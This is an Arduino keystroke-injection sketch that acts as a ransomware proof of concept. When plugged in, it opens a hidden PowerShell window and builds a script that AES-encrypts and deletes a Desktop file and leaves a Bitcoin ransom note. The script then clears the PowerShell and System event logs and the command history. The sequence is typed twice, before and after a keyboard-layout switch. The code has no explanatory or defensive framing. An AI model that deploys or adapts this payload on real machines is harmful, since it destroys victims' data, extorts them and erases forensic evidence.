#include <Keyboard.h>

void typeKey(int key) {
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell -windowstyle hidden -command \"cmd\"");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.println("echo $filePath=\"$env:USERPROFILE\\Desktop\\test.txt\";$encryptedPath=\"$env:USERPROFILE\\Desktop\\test_encrypted.hh2025\";$ransomNote=\"$env:USERPROFILE\\Desktop\\RANSOM_INFO.txt\" > %temp%\\enc.ps1");
  Keyboard.println("echo $key=-join ((65..90)+(97..122)^|Get-Random -Count 32^|%{[char]$_});if(Test-Path $filePath){$aes=[System.Security.Cryptography.Aes]::Create();$aes.KeySize=256;$aes.BlockSize=128 >> %temp%\\enc.ps1");
  Keyboard.println("echo $aes.Mode='CBC';$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($key);$aes.GenerateIV();$content=Get-Content $filePath -Raw -Encoding UTF8 >> %temp%\\enc.ps1");
  Keyboard.println("echo $bytes=[System.Text.Encoding]::UTF8.GetBytes($content);$encryptor=$aes.CreateEncryptor();$encrypted=$encryptor.TransformFinalBlock($bytes,0,$bytes.Length) >> %temp%\\enc.ps1");
  Keyboard.println("echo $iv=$aes.IV;$combined=$iv+$encrypted;[System.IO.File]::WriteAllBytes($encryptedPath,$combined);Remove-Item $filePath >> %temp%\\enc.ps1");
  Keyboard.println("echo $note=\"Your file has been encrypted!`nTo decrypt, send 1 BTC to: erfef3frefr43rf3ff3f`nKey (test): $key`nDo not delete this file!\";Set-Content -Path $ransomNote -Value $note} >> %temp%\\enc.ps1");
  Keyboard.println("echo Remove-Item \"%temp%\\enc.ps1\" -Force;wevtutil cl Microsoft-Windows-PowerShell/Operational;wevtutil cl System;Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*\" -Force >> %temp%\\enc.ps1");
  Keyboard.println("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %temp%\\enc.ps1");
  Keyboard.println("exit");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_ESC);

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_LEFT_SHIFT);
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell -windowstyle hidden -command \"cmd\"");
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.println("echo $filePath=\"$env:USERPROFILE\\Desktop\\test.txt\";$encryptedPath=\"$env:USERPROFILE\\Desktop\\test_encrypted.hh2025\";$ransomNote=\"$env:USERPROFILE\\Desktop\\RANSOM_INFO.txt\" > %temp%\\enc.ps1");
  Keyboard.println("echo $key=-join ((65..90)+(97..122)^|Get-Random -Count 32^|%{[char]$_});if(Test-Path $filePath){$aes=[System.Security.Cryptography.Aes]::Create();$aes.KeySize=256;$aes.BlockSize=128 >> %temp%\\enc.ps1");
  Keyboard.println("echo $aes.Mode='CBC';$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($key);$aes.GenerateIV();$content=Get-Content $filePath -Raw -Encoding UTF8 >> %temp%\\enc.ps1");
  Keyboard.println("echo $bytes=[System.Text.Encoding]::UTF8.GetBytes($content);$encryptor=$aes.CreateEncryptor();$encrypted=$encryptor.TransformFinalBlock($bytes,0,$bytes.Length) >> %temp%\\enc.ps1");
Keyboard.println("echo $iv=$aes.IV;$combined=$iv+$encrypted;[System.IO.File]::WriteAllBytes($encryptedPath,$combined);Remove-Item $filePath >> %temp%\\enc.ps1");
  Keyboard.println("echo $note=\"Your file has been encrypted!`nTo decrypt, send 1 BTC to: erfef3frefr43rf3ff3f`nKey (test): $key`nDo not delete this file!\";Set-Content -Path $ransomNote -Value $note} >> %temp%\\enc.ps1");
  Keyboard.println("echo Remove-Item \"%temp%\\enc.ps1\" -Force;wevtutil cl Microsoft-Windows-PowerShell/Operational;wevtutil cl System;Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\*\" -Force >> %temp%\\enc.ps1");
  Keyboard.println("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File %temp%\\enc.ps1");
  Keyboard.println("exit");
  typeKey(KEY_RETURN);

  Keyboard.end();
}
void loop() {}
